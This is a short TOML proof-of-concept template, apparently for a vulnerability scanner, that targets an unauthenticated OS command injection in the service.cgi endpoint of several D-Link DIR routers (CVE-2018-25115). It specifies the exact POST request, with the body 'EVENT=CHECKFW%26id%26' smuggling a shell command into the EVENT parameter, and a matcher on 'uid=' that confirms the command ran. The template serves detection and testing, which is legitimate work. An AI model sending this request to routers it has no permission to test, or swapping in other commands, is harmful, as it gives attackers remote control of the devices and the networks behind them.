[info]
id = "POC-AVE-2018-0044"
name = "D-Link DIR系列路由器 service.cgi 命令注入 PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "command-injection", "dlink", "router"]
description = "D-Link DIR系列路由器（DIR-110/412/600/610/615/645/815）固件1.03中service.cgi端点存在OS命令注入漏洞，EVENT=CHECKFW参数被直接传递给系统shell。远程攻击者无需认证即可通过构造的HTTP POST请求执行任意系统命令。"
vuln_id = ["CVE-2018-25115", "AVE-2018-0044"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/service.cgi"

headers.Content-Type = "application/x-www-form-urlencoded; charset=UTF-8"
headers.Host = "localhost"

body.type = "raw"
body.content = "EVENT=CHECKFW%26id%26"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["uid="]
expect = true
